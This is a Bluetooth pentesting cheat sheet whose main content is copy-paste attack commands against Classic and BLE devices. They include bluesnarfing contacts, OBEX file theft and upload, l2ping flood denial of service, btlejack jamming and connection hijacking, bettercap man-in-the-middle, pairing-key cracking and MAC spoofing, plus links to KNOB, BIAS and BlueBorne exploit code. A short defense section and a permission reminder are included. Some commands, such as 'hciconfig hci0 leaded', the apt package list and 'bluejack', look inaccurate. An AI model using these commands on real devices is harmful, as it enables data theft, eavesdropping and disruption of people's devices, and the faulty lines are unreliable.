# BLUETOOTH PENTESTING COMPLETE CHEAT SHEET

## 1. WHAT IS BLUETOOTH PENTESTING?

**Bluetooth pentesting** is the process of assessing the security of Bluetooth-enabled devices (Classic BR/EDR and Bluetooth Low Energy). It involves discovering devices, enumerating services, exploiting weaknesses, and testing for known vulnerabilities. Common targets include:

- **Audio accessories** (headsets, speakers)
- **Automotive systems** (car kits, infotainment)
- **Industrial / IoT sensors**
- **Medical devices**
- **Legacy enterprise hardware**
- **Wearables and mobile phones**

**Key fact:** Many historic attacks (BlueSnarf, BlueBug) are mitigated, but **KNOB**, **BIAS**, **BlueBorne**, and misconfigurations remain relevant against unpatched devices.

---

## 2. SETTING UP THE ENVIRONMENT

### 2.1 Install Tools (Kali / Debian / Ubuntu)

```bash
sudo apt update
sudo apt install bluetooth bluez blueman bluez-tools \
  hcitool bluetoothctl sdptool rfcomm \
  redfang btscanner bluesnarfer obexftp \
  bettercap btlejack ubertooth \
  crackle wireshark
```

### 2.2 Start Bluetooth Service

```bash
sudo systemctl start bluetooth
sudo systemctl enable bluetooth
sudo hciconfig hci0 up
```

### 2.3 Check Adapter

```bash
hciconfig -a
hciconfig hci0 up
hciconfig hci0 leaded   # Set discoverable/inquiry mode
```

---

## 3. DEVICE DISCOVERY

### 3.1 hcitool (Classic)

```bash
sudo hcitool inq                       # Inquiry scan
sudo hcitool scan --length=12          # 12-second scan
sudo hcitool scan                      # Default scan
sudo hcitool lescan                    # BLE scan
sudo hcitool con                       # Show current connections
```

### 3.2 bluetoothctl (Interactive)

```bash
bluetoothctl
> power on
> scan on
> devices
> scan off
> pair XX:XX:XX:XX:XX:XX
> trust XX:XX:XX:XX:XX:XX
> connect XX:XX:XX:XX:XX:XX
> disconnect
> remove XX:XX:XX:XX:XX:XX
```

### 3.3 redfang (Brute-force Non-Discoverable Devices)

```bash
sudo redfang -r 00:00:00:00:00:00-FF:FF:FF:FF:FF:FF
# Very slow (~7 hours per OUI prefix)
```

### 3.4 btscanner (GUI)

```bash
btscanner
# GUI interface similar to Kismet for Bluetooth
```

### 3.5 Ubertooth Scan (Advanced Sniffing)

```bash
ubertooth-scan                        # Scan with Ubertooth
ubertooth-scan -s                     # Extended inquiry scan
```

---

## 4. SERVICE ENUMERATION (SDP)

### 4.1 List Services

```bash
sdptool browse XX:XX:XX:XX:XX:XX
sdptool records XX:XX:XX:XX:XX:XX
sdptool search --bdaddr XX:XX:XX:XX:XX:XX <service>
```

### 4.2 Common Profiles and Attack Relevance

| Profile | UUID | Attack Relevance |
|---------|------|------------------|
| OBEX Object Push (OPP) | 0x1105 | BlueSnarf / BlueBug on legacy phones |
| OBEX File Transfer (FTP) | 0x1106 | Browse / write filesystem on legacy devices |
| Headset (HSP/HFP) | 0x1108 / 0x111E | Eavesdrop active call audio |
| Serial Port Profile (SPP) | 0x1101 | Industrial/IoT debug ports — often unauthenticated |
| HID | 0x1124 | Keyboard/mouse impersonation |
| Audio Sink/Source (A2DP) | 0x110B / 0x110A | Audio injection/eavesdrop |

---

## 5. CLASSIC BLUETOOTH ATTACKS

### 5.1 Bluejacking (Unsolicited Messages)

```bash
bluejack <MAC> <message>
# Or via obexftp
obexftp -b XX:XX:XX:XX:XX:XX -p file.txt
```

### 5.2 Bluesnarfing (Unauthorized Data Access)

```bash
bluesnarfer -r 1-10 -b XX:XX:XX:XX:XX:XX
bluesnarfer -r 1-10 -b XX:XX:XX:XX:XX:XX -C contacts
```

### 5.3 Bluebugging (Remote Control via AT Commands)

```bash
# Requires vulnerable device; tools vary
bluesnarfer -b XX:XX:XX:XX:XX:XX -C AT+...
```

### 5.4 OBEX File Transfer Abuse

```bash
obexftp -b XX:XX:XX:XX:XX:XX -l                 # List files
obexftp -b XX:XX:XX:XX:XX:XX -c /path -g file   # Get file
obexftp -b XX:XX:XX:XX:XX:XX -c /path -p file   # Put file
```

### 5.5 SPP Abuse (Serial Port Profile)

```bash
sudo rfcomm bind /dev/rfcomm0 XX:XX:XX:XX:XX:XX 1
sudo screen /dev/rfcomm0 9600
# Interact with the device's CLI / debug menu
```

### 5.6 l2ping (DoS / BlueSmack)

```bash
sudo l2ping XX:XX:XX:XX:XX:XX
sudo l2ping -f XX:XX:XX:XX:XX:XX        # Flood (DoS)
sudo l2ping -s 65507 XX:XX:XX:XX:XX:XX   # Max packet size
```

### 5.7 PIN Cracking (Legacy Pairing)

```bash
# Capture pairing with Wireshark / Ubertooth, then:
crackle -i capture.pcap -o cracked.pcap
# Extract PIN from cracked.pcap
```

### 5.8 Device Spoofing (MAC Spoofing)

```bash
sudo bdaddr -i hci0 XX:XX:XX:XX:XX:XX   # Change local MAC
# Or use spooftooph
spooftooph -i hci0 -a XX:XX:XX:XX:XX:XX
```

### 5.9 MITM (Man-in-the-Middle)

```bash
bettercap
> ble.recon on
> set ble.mitm true
> ble.mitm on
```

---

## 6. BLUETOOTH LOW ENERGY (BLE) ATTACKS

### 6.1 BLE Scanning

```bash
sudo hcitool lescan
sudo hcitool lescan --duplicates
bettercap
> ble.recon on
> events.show 60
```

### 6.2 GATT Enumeration

```bash
gatttool -b XX:XX:XX:XX:XX:XX -I
> connect
> primary
> characteristics
> char-desc
> char-read-hnd 0x0001
> char-write-req 0x0002 0100
> disconnect
```

### 6.3 Bettercap BLE Recon

```bash
sudo bettercap -eval "ble.recon on; events.show 60"
sudo bettercap -eval "ble.recon on; ble.show"
sudo bettercap -eval "ble.recon on; ble.enum XX:XX:XX:XX:XX:XX"
```

### 6.4 btlejack (Sniff / Jam / Hijack)

```bash
btlejack -s                             # Sniff
btlejack -j                             # Jam
btlejack -f <MAC> -j                    # Jam specific device
btlejack -f <MAC> -h                    # Hijack connection
```

### 6.5 GATTacker (BLE MITM)

```bash
# Node.js based BLE MITM
gattacker -a hci0 -s 1 -t <MAC>
```

### 6.6 Crackle (BLE Pairing Cracking)

```bash
crackle -i capture.pcap -o cracked.pcap
# Works on legacy BLE pairing with weak TK
```

---

## 7. KNOWN VULNERABILITIES

### 7.1 KNOB (CVE-2019-9506)

Forces Bluetooth pairing to negotiate a 1-byte encryption key, making the link key trivially brute-forceable.

```bash
# Test with internalblue (requires Broadcom firmware patch)
git clone https://github.com/seemoo-lab/internalblue
# Patch firmware to allow 1-byte key; pair with target; observe weak key
```

**Affected:** Older Broadcom-based devices, some Linux/Android stacks.

### 7.2 BIAS (CVE-2020-10135)

Bluetooth Impersonation AttackS — allows an attacker to impersonate a paired device.

```bash
# Test with BIAS tool
git clone https://github.com/francozappa/bias
```

### 7.3 BlueBorne (CVE-2017-1000251 and others)

Remote code execution over Bluetooth in Linux, Android, Windows, iOS.

```bash
# Exploit with BlueBorne PoC
# https://github.com/ArmisSecurity/blueborne
```

### 7.4 BLESA (BLE Spoofing Attacks)

Replay attacks against BLE reconnection.

### 7.5 SweynTooth (BLE Vulnerabilities)

```bash
git clone https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
```

---

## 8. TOOLS SUMMARY

| Tool | Purpose |
|------|---------|
| **hciconfig** | Adapter configuration |
| **hcitool** | Device discovery (Classic + BLE) |
| **bluetoothctl** | Modern BlueZ interactive client |
| **sdptool** | Service discovery (SDP) |
| **rfcomm** | Bind SPP services to /dev |
| **l2ping** | L2CAP ping / DoS |
| **redfang** | Brute-force non-discoverable devices |
| **btscanner** | GUI device scanner |
| **bluesnarfer** | Bluesnarfing / Bluebugging |
| **obexftp** | OBEX file transfer |
| **bettercap** | BLE MITM and recon |
| **btlejack** | BLE sniff/jam/hijack |
| **crackle** | BLE pairing cracking |
| **Ubertooth One** | Advanced sniffing (hardware) |
| **internalblue** | Broadcom firmware patching (KNOB) |

---

## 9. TIPS FOR TESTING

1. Always start with `hciconfig hci0 up` to enable the adapter.
2. Use `hcitool scan` for discoverable devices, `bluetoothctl` for interactive work.
3. For non-discoverable devices, use `redfang` (slow but effective).
4. Enumerate services with `sdptool browse` before attempting attacks.
5. Test SPP (0x1101) for unauthenticated debug access.
6. Use `l2ping -f` only for authorized DoS testing.
7. For BLE, use `bettercap` for recon and `gatttool` for GATT interaction.
8. Check for KNOB by testing pairing with 1-byte key (internalblue).
9. Capture traffic with Ubertooth + Wireshark for deep analysis.
10. Always test on devices you own or have permission to test.

---

## 10. DEFENSE / PREVENTION

| Rule | Explanation |
|------|-------------|
| **1. Disable Bluetooth when not in use** | Reduces attack surface. |
| **2. Use Bluetooth 5.0+ with LE Secure Connections** | Stronger pairing. |
| **3. Keep firmware updated** | Patches KNOB, BlueBorne, BIAS. |
| **4. Avoid Just Works pairing** | Use numeric comparison or passkey entry. |
| **5. Set devices to non-discoverable** | Prevents easy enumeration. |
| **6. Enforce encryption** | Disable legacy pairing. |
| **7. Monitor for unusual pairing attempts** | Detect brute-force. |
| **8. Use network segmentation** | Isolate Bluetooth-enabled IoT devices. |
| **9. Disable OBEX if not needed** | Prevents Bluesnarfing. |
| **10. Use Bluetooth firewalls** | Some devices support connection filtering. |

---

## 11. QUICK REFERENCE

| Purpose | Command |
|---------|---------|
| Enable adapter | `sudo hciconfig hci0 up` |
| Classic scan | `sudo hcitool scan` |
| BLE scan | `sudo hcitool lescan` |
| Interactive scan | `bluetoothctl` → `scan on` |
| List services | `sdptool browse <MAC>` |
| L2CAP ping | `sudo l2ping <MAC>` |
| DoS flood | `sudo l2ping -f <MAC>` |
| Bluesnarf | `bluesnarfer -r 1-10 -b <MAC>` |
| OBEX list | `obexftp -b <MAC> -l` |
| SPP bind | `sudo rfcomm bind /dev/rfcomm0 <MAC> 1` |
| BLE GATT | `gatttool -b <MAC> -I` |
| BLE MITM | `bettercap` → `ble.recon on; ble.mitm on` |
| BLE jam | `btlejack -j` |
| PIN crack | `crackle -i capture.pcap` |
